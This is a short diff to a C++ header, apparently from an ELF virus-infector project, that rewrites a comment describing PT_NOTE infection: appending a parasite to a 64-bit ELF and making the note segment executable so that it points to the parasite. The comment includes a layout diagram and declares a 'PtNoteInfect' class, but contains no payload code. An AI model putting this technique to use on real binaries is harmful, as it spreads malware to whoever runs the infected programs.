@@ -3,18 +3,20 @@
 #include <span>
 
 namespace vt::infector {
-// This algorithm injects a parasite into an 64 bit elf's code segment padding,
-
+// This algorithm injects a parasite to the end of the elf structure and mutate
+// the pt_note segment to be executable, pointing to our parasite.
+//
 //  host elf structure                           infected elf structure
 //  -------------------                          -----------------------
 //  elf_hdr            <------|    |----->       elf_hdr
 //  phdrs                 CODE|    |CODE         phdrs
 //  non-exec sections         |    |             non-exec sections
 //  exec sections             |    |             exec sections
-//  padding            <------|    |----->       *virus <---------
 //  non-exec sections  <------|    |----->       non-exec sections
-//  shdrs                 RO  |    | RO          shdrs
-//                     <------|    |----->
+//                        RO  |    | RO          
+//  shdrs              <------|    |----->       shdrs
+//                                 |CODE->       *virus <-------
+// The current
 class PtNoteInfect {
  public:
   size_t injected_host_size();
